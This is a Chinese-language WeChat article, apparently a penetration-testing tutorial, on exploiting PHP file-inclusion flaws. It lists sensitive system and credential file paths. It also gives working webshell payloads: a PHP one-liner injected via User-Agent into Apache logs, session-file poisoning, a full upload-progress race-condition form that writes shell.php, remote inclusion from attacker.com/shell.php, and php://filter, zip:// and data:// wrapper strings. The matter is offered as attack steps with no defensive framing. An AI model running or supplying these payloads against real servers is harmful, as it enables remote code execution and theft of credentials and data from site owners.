---
title: 文件包含
url: https://mp.weixin.qq.com/s/Jno97CLeQVjD7PXSTMesLA
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:39:06.372664
---

# 文件包含

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/zDpX4yCYbJatUDnJ6jgYavR4uHs5HLdia6wnAfMSCnuCLlT8OMzmNhsFGPXQxzAGl3Jq97BMzb7FKQpdbQSvUTw/0?wx_fmt=jpeg)

# 文件包含

原创

zoe
zoe

哦0吼

![]()

在小说阅读器中沉浸阅读

# 1、什么是文件包含

包含：把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。

有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。

# 2、漏洞核心

1. 存在可执行文件包含的核心函数（如 PHP 的include()、require()）；
2. 包含的文件路径 / 名称**可被用户控制**（如 URL 参数?file=xxx）；
3. 被包含的文件会被服务器当作当前脚本语言（如 PHP）直接解析执行（即使文件后缀是.jpg、.txt）。

# 3、PHP常用文件包含函数

**require():找不到被包含的文件会产生致命错误，并停止脚本运行**

**include():找不到被包含的文件只会产生警告，脚本继续执行**

**require\_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含**

**include\_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含**

# 4、辅助函数

**highlight\_file()：高亮显示文件完整源代码（直接输出到页面）；**

**show\_source()：与highlight\_file()功能一致，高亮显示文件源代码；**

**readfile()：读取文件内容并直接输出到页面（无高亮）；**

**file\_get\_contents()：读取文件内容并返回字符串（可赋值给变量，不直接输出）；**

**fopen() + fread()：打开文件并读取指定长度内容（需配合关闭文件函数fclose()）；**

**file()：读取文件内容，按行拆分为数组返回。**

5、前置基础

### 目录穿越  ../

### 常见敏感文件路径：

**Windows系统:**

C:\boot.ini //查看系统版本

C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件

C:\windows\repair\sam //存储Windows系统初次安装的密码

C:\ProgramFiles\mysql\my.ini //Mysql配置

C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码

C:\windows\php.ini //php配置信息

**Linux/Unix系统:**

/etc/password //账户信息

/etc/shadow //账户密码信息

/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置

/usr/local/app/php5/lib/php.ini //PHP相关配置

/etc/httpd/conf/httpd.conf //Apache配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置

/usr/local/app/php5/lib/php.ini //PHP相关配置

/etc/httpd/conf/httpd.conf //Apache配置文件

/etc/my.conf //mysql配置文件

# 5、本地文件包含

### 1、配合文件上传漏洞

有文件利用。上传含恶意代码的文件，利用文件包含解析执行恶意代码

利用文件上传等把恶意代码写入服务器本地文件，然后文件包含执行

eg:    http://xxx.com/include.php?file=./upload/webshell.jpg

### 2、包含Apache日志文件（无文件利用，无上传点）

**原理：**Apache 会记录所有访问请求（如访问 IP、请求路径、User-Agent 等）到日志文件，攻击者可修改请求的User-Agent为 PHP 恶意代码，让 Apache 将其写入日志，再通过文件包含漏洞包含该日志文件，执行恶意代码。

**利用条件：**

知道 Apache 日志文件的存储路径（如/var/log/apache2/access.log）；

对日志文件拥有「读权限」；

网站存在文件包含漏洞。

**操作：**

1、抓包，找到User-Agent字段，修改为 PHP 一句话木马

eg:   User-Agent: <?php @eval($\_POST['cmd'])?>

2、发送请求，让 Apache 将该User-Agent写入日志文件；

3、构造文件包含参数，访问 Apache 日志文件

eg :   http://xxx.com/include.php?file=../../../../var/log/apache2/access.log

### 3、包含Session文件（无文件利用，无上传点）

PHP 的 Session 会将用户会话数据存储在服务器本地文件中，若 Session 中存在「可被用户控制的变量」，攻击者可将恶意 PHP 代码写入 Session 变量，让服务器将其保存到 Session 文件，再通过文件包含漏洞包含该 Session 文件，执行恶意代码。

**利用条件：**

知道存储路径

对session文件有读权限

Session 中存在可控变量，且PHPSESSID可获取（在请求 Cookie 中）。

**关键信息：**

Session 文件命名格式：sess\_[PHPSESSID]（如PHPSESSID=abc123，对应文件sess\_abc123）；

常见存储路径：

/var/lib/php/sess\_PHPSESSID

/var/lib/php/sess\_PHPSESSID

/tmp/sess\_PHPSESSID

/tmp/sessions/sess\_PHPSESSID

php的session文件的保存路径可以在phpinfo的session.save\_path看到。

![](https://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJatUDnJ6jgYavR4uHs5HLdia1qNA3axwU10tR9vW0zad10ozxseyH15ibkHicgBdsuuyk24pBl2Wcafw/640?wx_fmt=png&from=appmsg)

**操作:**

1、查看请求Cookie中的PHPSESSID

2、将恶意 PHP 代码写入 Session 变量（如通过表单、URL 参数等可控入口）；

3、确认 Session 文件已生成，访问

eg:http://xxx.com/include.php?file=../../../../tmp/sess\_6e4f29a8d7f14f2b9c3d4e5f6a7b8c9d

### 4、利用PHP SESSION UPLOAD PROGRESS +条件竞争

**原理：**PHP\_SESSION\_UPLOAD\_PROGRESS是 PHP 的一个特性，用于跟踪文件上传进度，攻击者可利用该特性将恶意代码写入 Session 文件，再通过「条件竞争」快速访问该 Session 文件，在其被销毁前完成文件包含，执行恶意代码并生成永久 WebShell。

**步骤：**

1、构造上传表单（写入恶意代码，生成 Session 文件）：

<!DOCTYPE html>

<html>

<body>

<!-- 1. 核心表单标签：决定请求发送到哪里、以什么方式发送 -->

<form action="http://xxx.com/" method="POST" enctype="multipart/form-data">

    <!-- 2. 关键隐藏字段：触发PHP\_SESSION\_UPLOAD\_PROGRESS特性（核心中的核心） -->

    <input type="hidden" name="PHP\_SESSION\_UPLOAD\_PROGRESS" value="<?php fputs(fopen('shell.php','w'),'<?php @eval($\_POST[l]);?>');?>"/>

    <!-- 3. 文件上传字段：必须存在（触发上传进度跟踪，否则PHP\_SESSION\_UPLOAD\_PROGRESS不生效） -->

    <input type="file" name="file" />

    <!-- 4. 提交按钮：发送表单请求 -->

    <input type="submit" value="submit"/>

</form>

</body>

</html>

2、打开 Burp Suite，抓取该表单的上传请求包，持续发送（生成 Session 文件）；

3、构造文件包含请求

http://xxx.com/include.php?file=../../../../tmp/sess\_[PHPSESSID]

# 6、远程文件包含（RFI）

PHP 配置文件php.ini中需满足以下两个条件（默认高版本 PHP 已关闭，低版本常见）：

1. allow\_url\_fopen = On（允许打开远程文件）；
2. allow\_url\_include = On（允许包含远程文件）。

攻击者在自己的服务器（如http://attacker.com/）上创建恶意 PHP 文件shell.php，内容为一句话木马：<?php @eval($\_POST['cmd']); ?>

构造远程文件包含参数，访问目标网站：

http://xxx.com/include.php?file=http://attacker.com/shell.php

目标服务器包含并执行远程shell.php，使用蚁剑 / 菜刀连接，获取服务器权限。

# 7、PHP伪协议

![](https://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJatUDnJ6jgYavR4uHs5HLdia340Lo48oZZRGJA9nXIXM9X7rFR7yPNaiaQTd7I01ITrUrZLvM7fXXibw/640?wx_fmt=png&from=appmsg)

#

**1、file://协议：** 用于访问本地文件系统，不受allow\_url\_fopen与allow\_url\_include的影响

**2、php://协议：**

php://filter用于读取源码

php://input用于执行php代码 （allow\_url\_include：on）

**php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。**

php://filter/convert.base64-encode/resource=文件路径

**3、zip://协议**

zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。

**zip://中只能传入绝对路径。**

要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）

只需要是zip的压缩包即可，后缀名可以任意更改。

相同的类型还有zlib://和bzip2://

**zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip%23phpinfo.txt**

**4、data://协议**

需要：allow\_url\_fopen ：on    allow\_url\_include：on

data://text/plain,<?php phpinfo();?>

//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：

data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJYLKMBcUukj7iaad82ubg60VaW1mmPNFOTwtequELJmI0R6ecqHfp3hsomicqicaOXpOtJxSPOJanclQ/0?wx_fmt=png)

哦0吼

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJYLKMBcUukj7iaad82ubg60VaW1mmPNFOTwtequELJmI0R6ecqHfp3hsomicqicaOXpOtJxSPOJanclQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过